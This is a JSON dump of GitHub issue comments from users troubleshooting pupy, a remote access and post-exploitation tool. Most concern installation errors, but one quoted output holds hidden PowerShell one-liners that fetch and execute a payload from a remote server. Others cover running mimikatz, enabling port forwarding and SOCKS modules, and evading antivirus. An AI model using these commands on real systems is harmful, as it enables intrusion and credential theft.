    "p-l-": "@Strazzom @alxchk Unless you are granted the authorization by @n1nj4sec, please do not call your fork pupy2 or anything with pupy. You can fork an open-source project, but you are not free to use its name.. ",
    "iNoSec": "Sorry for this stupid question but with all this fork and all this branch im lost in my choice... if i understand well the alpha must be the most up to date with all the alxchk and LaZagne change in their own repo?? i burn or im back with penguins?. ",
    "kfr-ma": "Hi ,\nAh Ok Thx you \nRegards. . ",
    "GhostNaix": "Ran the exact commands as documented in readme.md still produced the same results it doesn't seem that it;s able to. I know this is out of context but do you require to run the commands under Docker subtitle if you're not using a docker image. ",
    "LeahXucud": "I had this issue, go to external/pykcp/kcp and execute:\ngit submodule init\ngit submodule update\nget back to pupy dir and \"pip install -r pupy/requirements.txt\" again.. check this out:\ncd pupy; pip install -r requirements.txt. ",
    "TurekBot": "@LeahXucud, I tried your suggestion, but I'm still getting the same thing.\nubuntu@ubuntu:~/Desktop/pupy$ pip install -r pupy/requirements.txt\nexternal/pykcp should either be a path to a local project or a VCS url beginning with svn+, git+, hg+, or bzr+\nubuntu@ubuntu:~/Desktop/pupy$ cd ..\nubuntu@ubuntu:~/Desktop$ cd pupy/\nubuntu@ubuntu:~/Desktop/pupy$ ls\nbuild-docker.sh  client  create-workspace.py  docs  LICENSE  pupy  README.md\nubuntu@ubuntu:~/Desktop/pupy$ cd pupy/\nubuntu@ubuntu:~/Desktop/pupy/pupy$ ls\ncommands        external           pp.py              pupysh.py\nconf            modules            proxy              requirements.txt\ncrypto          network            pupy.conf.default  scriptlets\nDEVELOPMENT.md  packages           pupygen.py         webstatic\nDockerfile      payload_templates  pupylib\nubuntu@ubuntu:~/Desktop/pupy/pupy$ cd external/\nubuntu@ubuntu:~/Desktop/pupy/pupy/external$ cd pykcp/\nubuntu@ubuntu:~/Desktop/pupy/pupy/external/pykcp$ cd kcp/\nubuntu@ubuntu:~/Desktop/pupy/pupy/external/pykcp/kcp$ git submodule init\nSubmodule 'kcp' (https://github.com/skywind3000/kcp.git) registered for path '../kcp'\nubuntu@ubuntu:~/Desktop/pupy/pupy/external/pykcp/kcp$ git submodule update\nCloning into 'kcp'...\nremote: Counting objects: 388, done.\nremote: Total 388 (delta 0), reused 0 (delta 0), pack-reused 388\nReceiving objects: 100% (388/388), 116.09 KiB | 0 bytes/s, done.\nResolving deltas: 100% (230/230), done.\nChecking connectivity... done.\nSubmodule path '../kcp': checked out '110f9b19daefc7f2ba39c3597c8541fc28e755a1'\nubuntu@ubuntu:~/Desktop/pupy/pupy/external/pykcp/kcp$ cd ../../..\nubuntu@ubuntu:~/Desktop/pupy/pupy$ cd ..\nubuntu@ubuntu:~/Desktop/pupy$ \nubuntu@ubuntu:~/Desktop/pupy$ pip install -r pupy/requirements.txt\nexternal/pykcp should either be a path to a local project or a VCS url beginning with svn+, git+, hg+, or bzr+\n\n. ",
    "RazorApple": "@LeahXucud's suggestion worked. Please close the issue\n. ",
    "lonewolf210": "Edit: realized this the wrong place for the comment I made . Wanted to specify this was using the instructions to launch the docker install, that are in the read me, that has you ssh into the docker. I also tried using the GNOME preferences to re-enable the scroll bar and it still didn't work. \nusing the instructions in the wiki to launch the docker and then navigate to launch pupysh.py does not have this issue.\nAlso do the ls, pwd, etc commands only work when a client is connected? The help modules are there but it keeps telling me that it doesn't recognize those commands but the I see the 3 August bug report says they  are working.. Thanks! One more question though I cannot for the life of me figure out the listener syntax and as such can not get any of the payloads to establish a connection. \nI have confirmed that the beacon is calling back from the test vm but can't get a connection. I have gotten cobalt strike to work so I know that networking isn't the issue. Well, at least between the kali box and windows box. I'm new to docker so I'm not sure if I need to be doing some kind of port looping or something. \nI know it would probably be easier to just install the non docker version but I would like to learn how to use docker. . Also the docs seem to imply that the name of the listener needs to be added twice which is not true and will cause the listener to fail silently as well\n. The issue seems to be how args are being passed with the call to Server.add_listener()\nserver.add_listener(name, ' '.join(args), motd=False)\nwhich when called is using the arguments as the config and bypassing the check \n```\ndef add_listener(self, name, config=None, motd=False):\n    if self.listeners and name in self.listeners:\n        self.handler.display_warning('Listener {} already registered'.format(name))\n        return\n\n    listener_config = config or self.config.get('listeners', name)\n\n```\nSeems like the check should be on a separate line so it's always called rather then only when a config is not provided.         \nedit:\nThe other option would be to put a try-except block in the Listener class around self.transport = transports[self.name]() so that when it tries to call an invalid key/module an exception is raised. On that note there should also be a try-except around the listener object initialization in add_listener so that if it fails the exception is passed out to the user. Something like this:\ntry:\n            listener = Listener(\n                    self,\n                    name,\n                    listener_config,\n                    httpd=self.httpd,\n                    igd=self.igd,\n                    local=self.config.get('pupyd', 'address'),\n                    external=self.config.get('pupyd', 'external'),\n                    pproxy=self.pproxy_listener\n                    )\n        except Exception, e:\n            self.handler.display_warning(e) . Sure \nHere is the current help doc statement which as I said before is at the very least confusing: \n```\n\n\nlisten -h\nusage: listen [-h] [-l | -a ADD [ADD ...] | -r REMOVE]\n\n\nstart/stop/show current listeners\noptional arguments:\n  -h, --help            show this help message and exit\n  -l, --list            show current listeners\n  -a ADD [ADD ...], --add ADD [ADD ...]\n                        start listener NAME [ARGS]\n  -r REMOVE, --remove REMOVE\n                        stop listener NAME\nHere is what happens when you put an unknown transport without any arguments and it fails properly:\n\n\nlisten -a test\n[-] Listener test is not known\n```\nEdit: Really this error statement isn't great either because it's the fact that test isn't a known transport protocol that's the issue and no where in the help documentation or current errors does it imply that NAME must be a transport type. This is particularly misleading since pretty much every other  command uses a -t to specify which transport should be use. My initial thoughts when first trying to use this was that NAME was simply what I wanted to call the listener for keep track of it.\n\n\nNow here is a couple of different cases where it fails silently:\n```\n\n\nlisten -a test 445\n```\n\n\n```\n\n\nlisten -a http http 445\n```\n\n\n```\n\n\nlisten -a test http 8080\n```\n\n\nIf you at the very least add the try-except around the Listener object initialization you start getting:\n```\n\n\nlisten -a test 445\n[!] 'test'\nException AttributeError: \"'Listener' object has no attribute 'igd_mapping'\" in > ignored\n```\n\n\n```\n\n\nlisten -a http http 445\n[!] Invalid local port: t\n```\n\n\nWhich aren't necessarily the most informative exception statements but at least it tells you something is going wrong.     . ",
    "SammySet007": "I have the same issue (i.e jarsigner is installed but error code 1) #665 I have been advised its due to the pupy-apk-release-key.keystore file being the issue. \nIf I run \njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_E4cTkT' pupy_key\nThe temp file will be missing (even based on my own temp file) so not sure where to test from here. A docker instance works fine however I need this to work from a public IP so the docker instance becomes an issue here (limited docker knowledge). Also within pupysh if i generate an apk I also get the error\npayload generation failed: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_gSaL_C' pupy_key' returned non-zero exit status 1. Also just repeated the above in Debian 9 with the same error code. . Many thanks, I generated a signed key using the method below \nkeytool -genkey -v -keystore pupy-apk-release-key.keystore\nStill get the same error. Is there a specific way to generate the keys?. ",
    "clancrate": "thanks :+1: . ",
    "currymygod": "@alxchk  @Strazzom @Strazzom i need help now..... please help me to solve the ploblem. @n1nj4sec @alxchk @Strazzom  i need help now..... please help me to solve the ploblem. in centos 7 \nyum install fuse fuse-devel \nthanks . @n1nj4sec @alxchk @Strazzom i need help now..... please help me to solve the ploblem. in centos 7 -----thanks. @alxchk i can not use any modules??? why???. @alxchk I didn't catch your meaning.Can you give me more details?. @alxchk Thank you for helping me solve these problems.\n1.What module is libuv and how to use it.\n2.How to enable portfwd and socks5proxy in configuration. How to enable portfwd and socks5proxy in configuration???. I have two sessions,one of them can use forward,another is not allowed to use forward.Please look at the screenshots.@alxchk. \n. @alxchk can you help me ???. > > How to enable portfwd and socks5proxy in configuration???\n\nChange enable_dangerous_modules = false to true.\n\nhave two sessions,one of them can use forward,another is not allowed to use forward\n\nLooks like libraries were not loaded at second session. What is the client/target?\n\nIt's just an ordinary target.Why did the second session do not load the library?. > Don't have any idea without additional information. You can build/run client with --debug option and upload log. Maybe some info will be found there\nThank you for helping me solve these problems.. @alxchk  My goal is an Amazon cloud host.I'm using it for testing.. ",
    "Zorilixer": "Thanks. Your solution approach is better. But it seems to has issues.\ngen ... -d 10 10 30 connect  ... \n` \n[-] payload generation failed: sequence item 0: expected string, list found\nTraceback (most recent call last):\n  File \"/opt/pupy/pupy.git/pupy/commands/gen.py\", line 133, in do\n    output = pupygen.pupygen(args, config, server, handler.display)\n  File \"/opt/pupy/pupy.git/pupy/pupygen.py\", line 657, in pupygen\n    compressed=not (args.uncompressed or args.packer)\n  File \"/opt/pupy/pupy.git/pupy/pupygen.py\", line 440, in generate_binary_from_template\n    } for k,v in config.iteritems() if v]\nTypeError: sequence item 0: expected string, list found\n ` \nargparse seems to store the delay list as list type which does not work for iteritems.\nPerhaps store it as a string, then later split it?\n. ",
    "ambient-singularity": "This appears to have been resolved since last night, though am having issues with PS payloads; will open a new issue if needed. Thanks!. ",
    "saturnboy0": "Update: I think my confusion is: I am trying to download the files via the bash shell to my local machine and am not able to. What is the standard method of retrieving these files after attaching the pupy image? Done via scp?. ",
    "jasc22": "Thanks for your response, Strazzom. I tried running it using pupygen.sh and then using the workspace method pupyws/bin/pupysh. Using the first method the victim downloads the payloads however does not establish a session. The second method establishes a session but hangs and I'm not able to execute any commands. Please see the gist below which includes the log and netstat on Kali Rolling. The victim is running Windows 10 Pro. I tried this on Windows 7 as well and it behaves the same way.\nhttps://gist.github.com/jasc22/67767f1a672d742471303b1f53fbf6ce\nAppreciate your help with this.. After typing Ctrl+C the session was still established and I was able to interact with the system. Not sure what the issue might be but it works now.. Thanks for the explanation and look forward to the fix. Appreciate your help with this.. Hey @alxchk, thanks for your response. I was testing to see the type of traffic being passed when using obfs3. I generated a Windows binary that's using obfs3 and started a respective listener but there is no connection being established. I tried the same for ScrambleSuite and that works fine. Does this option only work through TOR?. Thanks, @alxchk! Appreciate your help regarding this.. ",
    "zaicce1": "No not yet\nOn 2 Oct 2018 06:42, \"jasc22\" notifications@github.com wrote:\n\nI've been playing with this for a while but can't seem to get a shell\nback using a PS oneliner. I also disabled Defender and the Firewall. When I\nrun an executable it works and I get a shell back. I also increased my VM's\nmemory since I saw someone else had a similar issues but that did not work\neither.\nPlease see output below. Thanks in advance!\nroot@rolling:/opt/pupy/pupy# ./pupygen.py -f ps1_oneliner -O windows -A\nx64 --randomize-hash connect --host 192.168.106.161:443 -t ssl\nNo handlers could be found for logger \"pupy.network.pss\"\n[!] Press Ctrl+C to stop server\n[+] Generating puppy dll to gain server reaction time. Be patient...\n{ Configuration }\nKEY VALUE\nlauncher connect\nlauncher_args --host 192.168.106.161:443 -t ssl\ncid 0xbd45a180L\noffline_script PRESENT\n[I] Credentials password:\n[+] Required credentials (found)\nSSL_BIND_CERT\nSSL_CA_CERT\nSSL_CLIENT_CERT\nSSL_BIND_KEY\nSSL_CLIENT_KEY\n[+] X86 dll loaded and 46 variables used\n{ Configuration }\nKEY VALUE\nlauncher connect\nlauncher_args --host 192.168.106.161:443 -t ssl\ncid 0xbd45a180L\noffline_script PRESENT\n[+] Required credentials (found)\nSSL_BIND_CERT\nSSL_CA_CERT\nSSL_CLIENT_CERT\nSSL_BIND_KEY\nSSL_CLIENT_KEY\n[+] X64 dll loaded and 51 variables used\n[+] Copy/paste one of these one-line loader to deploy pupy without\nwriting on the disk:\npowershell.exe -w hidden -noni -nop -c\n\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object\nNet.WebClient).DownloadString('https://192.168.106.161:8080/IgeUdgceYB.txt')\n;\"\npowershell.exe -w hidden -noni -nop -enc\nWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAPQB7ACQAdAByAHUAZQB9ADsASQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAA2AC4AMQA2ADEAOgA4ADAAOAAwAC8ASQBnAGUAVQBkAGcAYwBlAFkAQgAuAHQAeAB0ACcAKQA7AA==\n[!] Please note that even if the target's system uses a proxy, this\nprevious powershell command will not use the proxy for downloading pupy\n[+] Started http server on 0.0.0.0:8080\n[+] Waiting for a connection ...\n192.168.106.143 - - [01/Oct/2018 13:37:58] \"GET /IgeUdgceYB.txt HTTP/1.1\"\n200 -\n[+] [Stage 1/2] Powershell script served !\n192.168.106.143 - - [01/Oct/2018 13:37:58] \"GET /KpaLwqbvhB.txt HTTP/1.1\"\n200 -\n[+] Remote script is running in a x64 powershell process\n[+] [Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll\nembedded) served!\n[+] 192.168.106.143:You should have a pupy shell in few seconds from this\nhost...\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. \n",
    "j3ssie": "very clear thanks you.. > ttyrec will work only on Linux and on very recent kernels.\n\nThis thing uses kprobes kernel API which is very new thing.\nIt /may/ work with >=3.16, it works (but in some cases may crash kernel x_x) with >= 4.9, and looks stable with >= 4.14.\n\nI think my kernel version is fine for ttyrec, right?\nLinux Myhostname 2.6.32-431.23.3.el6.x86_64 #1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\n\nAccording to your message LaZagne loaded to client is older than interface in modules. Likely you have been updated very short time ago. You probably should unload old module first with:\nload_package -r lazagne \nload_package -r LaZagne\nAfter I successful run command above I still get same error and yeah I just preinstall pupy from Quick install and configure from README.md. \n",
    "johncole2017": "I must say this too, the Original one.\npupy uses ReflectiveDLLinject and this method detects by most of AVs ,\nI want to know is there any way to bypass this or use another module for not detect by AVs ?\nMy first question goal is this : I want use pupy without any intruder, and not taken by any AVs .\nthanks a lot. ",
    "hohenh": "AlessandroZ,\nI see now, \n\nThe string is random for -f ps1_oneliner, so the server is :8080/random.txt and how you say with-f py_oneliner that not random and I can restart the server if is down, for reconnect with the target. \nThat why i need, because if you use -f ps1_oneliner, and that crash, you can't reconnect with target. I test the payload on windows 10. \nBut -f py_oneliner not use https, and that python code, i need a + powershell.exe for use with windows. \n\nIs it possible to modify that in the ps1_oneliner.py ?\nOr, maybe i can try to find a way.\nThank for helps, and sorry for my english. AlessandroZ,\nThank now i can restart the server payload:8080,\nI have modify this line --> https://github.com/n1nj4sec/pupy/blob/245ed7634c942f22c3e779062beba920dbce8a9d/pupy/pupylib/payloads/ps1_oneliner.py#L60\nTo -- >\n\nurl_random_one      = 'testing.txt'\n\nNow, i can reuse the same power shell line, or reconnect the server if is down, that work great, thank for help \n. Thank for answer alxchk, but i have try like you say : \n```\n[on_connect]\n* = include:default_commands\n[default_commands]\n1 = beroot\n2 = getuid\n```\nThat run nothing, i have try other syntax but don't work for the moment :(. If i try like that :\n[on_connect]\nany_1 = beroot\nany_2 = getuid\nOR\n```\n[on_connect]\n* = include:default_commands\n[default_commands]\nany_1 = beroot\nany_2 = getuid\n```\nOR\n```\n[on_connect]\nany_ = include:default_commands\n[default_commands]\nany_1 = beroot\nany_2 = getuid\n```\nOR\n```\n[on_connect]\nany = include:default_commands\n[default_commands]\nany1 = beroot\nany2 = getuid\n```\nI have No clients match this search!. ",
    "tanujain": "ok thanks. It is working.. ok for mac it's not implemented.. ok. Readme says mac is supported. it is little bit confusing whether it's supported or not.. ",
    "Gutzblackswordsman": "currently trying to use this on kali, not sure if the issue is the linux distro \n. ",
    "Brysonian10": "where should we install the dev packets\n. ",
    "cs-simon": "I already install all dev still got same issue?\nroot@kali:~/Desktop/pupy/pupy# apt-get install git libssl1.1\nReading package lists... Done\nBuilding dependency tree     \nReading state information... Done\nlibssl1.1 is already the newest version (1.1.0f-5).\ngit is already the newest version (1:2.14.1-3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nroot@kali:~/Desktop/pupy/pupy# apt-get install git libssl1.0.2 \nReading package lists... Done\nBuilding dependency tree     \nReading state information... Done\nlibssl1.0.2 is already the newest version (1.0.2l-2).\ngit is already the newest version (1:2.14.1-3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nroot@kali:~/Desktop/pupy/pupy# apt-get install git libffi\nlibffi-dev  libffi6   \nroot@kali:~/Desktop/pupy/pupy# apt-get install git libffi\nlibffi-dev  libffi6   \nroot@kali:~/Desktop/pupy/pupy# apt-get install git libffi-dev\nReading package lists... Done\nBuilding dependency tree     \nReading state information... Done\nlibffi-dev is already the newest version (3.2.1-6).\ngit is already the newest version (1:2.14.1-3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nroot@kali:~/Desktop/pupy/pupy# apt-get install git python\nDisplay all 313 possibilities? (y or n)\nroot@kali:~/Desktop/pupy/pupy# apt-get install git python-dev\nReading package lists... Done\nBuilding dependency tree     \nReading state information... Done\npython-dev is already the newest version (2.7.13-2).\ngit is already the newest version (1:2.14.1-3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nroot@kali:~/Desktop/pupy/pupy# apt-get install git python-pip\nReading package lists... Done\nBuilding dependency tree     \nReading state information... Done\npython-pip is already the newest version (9.0.1-2).\ngit is already the newest version (1:2.14.1-3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\nroot@kali:~/Desktop/pupy/pupy# ^C\n. ",
    "thewerdisberd": "I was missing the -t argument for the transport options.\nWas there a change to make this required? I do not remember needing that flag in the past.\nAlso, is there a reason pupygen doesn't validate the arguments?. Thanks for the help @alxchk . ",
    "RoryGremmRaury": "this was a kali linux install, i downloaded the master.zip from this sight, installed all required packages from the requirement.txt file then ran the install.sh. after which i ran pupygen for an apk and i got the following,\ni tested for an .exe and still got the same error, no payload template, i also noticed in the git repository in the payload_template folder there are no templates in there. am i suppose to pull templates from a separate source, or are they suppose to be with the master.zip? . ",
    "magnusstubman": "What I'm really looking for is maybe a listener/payload solution as Empire's http listener that just keeps running until I kill it.. @alxchk, I know what you mean, but what do you use instead in situations where you can't touch disk?. ",
    "ifrid99": "would it help if you place a picture with the error that gives me?. ",
    "GoldLine": "Ok the problem now fixed but I got a new problem xD\nEOF occurred in violation of protocol (_ssl.c:726)\nTraceback (most recent call last):\nFile \"f:183\", line 84, in iterate\nFile \"f:14c\", line 174, in connect\nSSLEOFError: EOF occurred in violation of protocol (_ssl.c:726). ",
    "morganpi": "use\npip install pyelftools.",
    "Ahmedabdsalam": "Actually, I am not familiar with pupy , I had just installed. How do I know if I am using docker version, And what should I do if I use docker?. ",
    "99bit": "@alxchk can you tell me how excetly create exe or apk file and how to control it. ",
    "edoz90": "@Ahmedabdsalam \nRunning pupysh you get the server prompt (that is the CC shell); now with help you can see all commands that it's possibile to execute.\nTo generate a payload for [-] Oneliners only supported from pupysh.. use the gen command.\nWith gen --help you can see all available options. ",
    "xbhuang1994": "I also encountered the same problem, I am very happy to see it being fixed quickly, this project is really great! I am willing to donate a little bitcoin to buy a few cups of coffee during the development process! Give me your bitcoin wallet address! @alxchk . ",
    "bluethepill": "Many thanks.\nYou should really consider donation button :). ",
    "LevitatingBusinessMan": "Have you tried not running as root?. ",
    "User122333": "I am using port 4782. As for the elevated account, I tried running \"sudo pupysh\" and it \"said\" \"sudo: pupysh: command not found\". When I tried running the python file directly I got this output:\nuser@user-PC:\\~/pupy/pupy$ sudo python pupygen.py\nNo handlers could be found for logger \"pupy.network.pss\"\nTraceback (most recent call last):\n  File \"pupygen.py\", line 31, in \n    from pupylib.utils.network import get_listener_ip, get_listener_port\n  File \"/home/roi/pupy/pupy/pupylib/init.py\", line 21, in \n    from PupyCmd import PupyCmdLoop\n  File \"/home/roi/pupy/pupy/pupylib/PupyCmd.py\", line 36, in \n    from .PupyModule import (\n  File \"/home/roi/pupy/pupy/pupylib/PupyModule.py\", line 18, in \n    from .PupyCompleter import PupyModCompleter, void_completer, list_completer\n  File \"/home/roi/pupy/pupy/pupylib/PupyCompleter.py\", line 24, in \n    from .payloads.dependencies import paths\n  File \"/home/roi/pupy/pupy/pupylib/payloads/dependencies.py\", line 10, in \n    from elftools.elf.elffile import ELFFile\nImportError: No module named elftools.elf.elffile\nuser@user-PC:\\~/pupy/pupy$ sudo python3 pupygen.py\n  File \"pupygen.py\", line 214\n    os.chmod(os.path.join(root, dir), 0700)\n                                         ^\nSyntaxError: invalid token\nuser@user-PC:\\~/pupy/pupy$. I am following the wiki. Literally all I did was clone it, install dependencies, and followed the pupy installation guide on the wiki for Debian/Ubuntu.. whenever I try to run create-workspace.py without root privilages I get this:\n[+] Pupy at /home/user/pupy\n[+] Compile common templates\n/home/user/pupy\n[+] Build sources with toolchain alxchk/tc-windows\ndocker: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post http://%2Fvar%2Frun%2Fdocker.sock/v1.39/containers/create?name=build-pupy-windows: dial unix /var/run/docker.sock: connect: permission denied.\nSee 'docker run --help'.\nTraceback (most recent call last):\n  File \"./create-workspace.py\", line 196, in \n    main()\n  File \"./create-workspace.py\", line 84, in main\n    ], env=env, cwd=os.path.join(args.pupy_git_folder, 'client'))\n  File \"/usr/lib/python2.7/subprocess.py\", line 190, in check_call\n    raise CalledProcessError(retcode, cmd)\nsubprocess.CalledProcessError: Command '['/home/user/pupy/client/build-docker.sh']' returned non-zero exit status 126\nsidenote, thanks for trying to help. will just get a kali vm or something. ",
    "rayleeafar": "\n\nwould be great to have a client compiled, but I'm not that strong at cross compiling...\n\nIt's very unlikely something exists for python. The only way to do it on x86 likely using qemu. But you can compile this on the target itself\n\nHi~ May I ask a question,  Do you have any suggestions on how to compile pupy client for ARM architecture, many thanks~\u2229_\u2229~. ",
    "Hazpartame": "Okay i feel stupid. :'( . Ok it's working !\nI will now try use my own IP Public. \nWhat i have to change ? Only that ? Or i need to unlock something else\nDefault external address for all transports\nexternal = IP:PORT. Ok i'm wrong, all is okay it's just port forwarding. \nThx you for unlocking me :D. ",
    "TheOncomingStorm": "That helped. Thanks. . ",
    "Anonymous811822525": "have u fixed it yet ? i am running the same error too i guess will have to fix it on our own or wait for somebody to reply.\ni am gonna contact the creator and do my research and ill tell you if ive fixed it.\n. ",
    "brimstone": "Github is confusing how it linked to caac807 in this repo and not in alxchk/pupy. That commit does infact not give errors around the info command on XP. Maybe some of those changes can get merged into this repo?. ",
    "Froas": "No handlers could be found for logger \"pupy.network.pss\"\n. second problem\n. ",
    "fastchain": "Got it thank you!\nI've just  tried to run mimikatz from the shell and got this\n```\n\n\nrun mimikatz\n[-] You are in a x86 process right now. You have to be in a x64 process for running Mimikatz.\n[-] Otherwise, the following Mimikatz error will occur after 'sekurlsa::logonPasswords':\n[-] 'ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process'\n[-] Mimikatz has not been executed on the target\n\n\n```\nIs it possible to define somehow  which version (x64/x86) to use?\n. "
}